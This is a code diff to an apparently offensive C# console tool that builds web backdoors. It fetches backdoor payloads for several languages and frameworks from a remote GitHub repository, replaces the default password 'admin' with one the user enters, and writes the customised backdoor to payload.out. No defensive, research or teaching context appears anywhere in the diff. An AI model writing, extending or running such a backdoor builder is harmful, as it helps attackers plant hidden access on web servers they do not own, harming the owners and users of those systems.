@@ -197,7 +197,7 @@ public static class Program
             "NodeJS","Ruby","PHP","C#/NET","Flask","Django"
                }));
             AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] Payload Is Set To: {langt}  \n");
-            void getpayload1(string lang,string method)
+            void getpayload1(string lang,string method,string password)
             {
                 try
                 {
@@ -219,13 +219,15 @@ public static class Program
                         AnsiConsole.Markup($"[bold indianred1][[Error]][/] File Error\n");
                         System.Environment.Exit(0);
                     }
+                    File.WriteAllText("payload.out", "");
                     var url = $"https://raw.githubusercontent.com/NSXSoftware/anchovE-Payloads/main/{method}{lang}.{ending}";
                     var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                     var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                     using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                     {
                         var result = streamReader.ReadToEnd();
-                        Console.WriteLine(result);
+                        var resu = result.Replace("admin", password);
+                        File.AppendAllText("payload.out", resu);
                     }
                 }
                 catch
@@ -234,7 +236,7 @@ public static class Program
                     System.Environment.Exit(0);
                 }
             }
-            void getpayload2(string lang)
+            void getpayload2(string lang,string password)
             {
                 try
                 {
@@ -256,13 +258,16 @@ public static class Program
                         AnsiConsole.Markup($"[bold indianred1][[Error]][/] File Error\n");
                         System.Environment.Exit(0);
                     }
+                    File.WriteAllText("payload.out", "");
                     var url = $"https://raw.githubusercontent.com/NSXSoftware/anchovE-Payloads/main/{lang}.{ending}";
                     var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                     var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                     using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                     {
                         var result = streamReader.ReadToEnd();
-                        Console.WriteLine(result);
+                        var resu = result.Replace("admin", password);
+                        File.AppendAllText("payload.out", resu);
+
                     }
                 }
                 catch
@@ -271,8 +276,8 @@ public static class Program
                     System.Environment.Exit(0);
                 }
             }
-            var filename = AnsiConsole.Ask<string>("Enter [#107dac]FileName[/] >");
-            AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] FileName Is Set To: {filename}  \n");
+           // var filename = AnsiConsole.Ask<string>("Enter [#107dac]FileName[/] >");
+            //AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] FileName Is Set To: {filename}  \n");
             AnsiConsole.Markup("Enter Backdoor [#107dac]Password [/][hotpink2][[Defualt: admin]][/] ");
             Console.Write("> ");
             var password = Console.ReadLine();
@@ -289,12 +294,12 @@ public static class Program
                         .AddChoices(new[] { "GET", "POST" })
                 );
                 AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] Building A Payload for {langt} With Method {divtype}\n");
-                getpayload1(langt, divtype);
+                getpayload1(langt,divtype,password);
             }
             else
             {
                 AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] Building A Payload for {langt}\n");
-                getpayload2(langt);
+                getpayload2(langt,password);
 
             }
         }
